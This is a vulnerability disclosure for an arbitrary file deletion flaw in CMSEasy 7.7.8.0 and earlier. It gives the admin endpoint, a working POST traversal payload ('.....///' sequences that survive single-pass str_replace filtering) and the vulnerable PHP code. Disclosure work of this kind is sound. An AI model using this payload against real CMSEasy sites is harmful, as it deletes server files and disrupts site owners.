# CMSEasy <= 7.7.8.0 has a arbitrary file deletion vulnerability
##### Vulnerability Location: /lib/admin/database_admin.php
##### Affected Range: CMSEasy <= 7.7.8.0
##### Vulnerability Cause: database_admin.php contains a serious security vulnerability that allows attackers to delete arbitrary files.
##### Vulnerability Impact: The server is operating abnormally.
##### Link:https://www.cmseasy.cn/
# Vulnerability recurrence

Under the directory D:\phpstudy_pro\WWW, a flag.txt file was created, and its content is as follows:

![image](https://github.com/user-attachments/assets/eed22fb7-7a43-47ab-800b-e519fb944a79)

Using interface: http://127.0.0.1:81/index.php? act=backAll&1&case=database&site=default, two parameters are passed by POST: submit=1&select[]=..... ///1.txt

![image](https://github.com/user-attachments/assets/f28c582d-64bb-47a2-a2f3-a9d3df379741)

Change the parameter value of the select array to:.....///.....///.....///flag.txt, although it indicates that the xxxx template does not exist here, the file has already been deleted.
Dynamic debugging revealed that the incoming payload, after multiple replacements, successfully became.. /.. /.. /flag.txt

![image](https://github.com/user-attachments/assets/94488049-66de-4537-9ed0-d3996e2507a0)

# Code Analysis

The backAll_action method in/ lib/admin/database_admin.php:

```php
function backAll_action(){
    $dir=ROOT.'/data/backup-website';
    if(front::post('submit') &&is_array(front::post('select'))) {
        foreach(front::post('select') as $d) {
            $d = str_replace('#', '', $d);
            $d = str_replace('../', '', $d);
            $d = str_replace('./', '', $d);
            @unlink($dir.'/'.$d);
        }
        front::flash(lang_admin('success').lang_admin('delete').count(front::post('select')).lang_admin('individual').lang_admin('archives').'！');
    }
    $dirs=front::scan($dir);
    $db_dirs=array();
    foreach($dirs as $dir) {
        if(!preg_match('/\.\./',$dir)) $db_dirs[]=service::lockString($dir);
    }
    //var_dump($db_dirs);
    $this->view->db_dirs=$db_dirs;
}
```
str_replace函数仅仅是执行一次替换，当传入".....///1.txt"的时候，经过三次str_replace函数的替换，最终变成了"../1.txt"，从而实现目录穿越，造成任意文件删除。
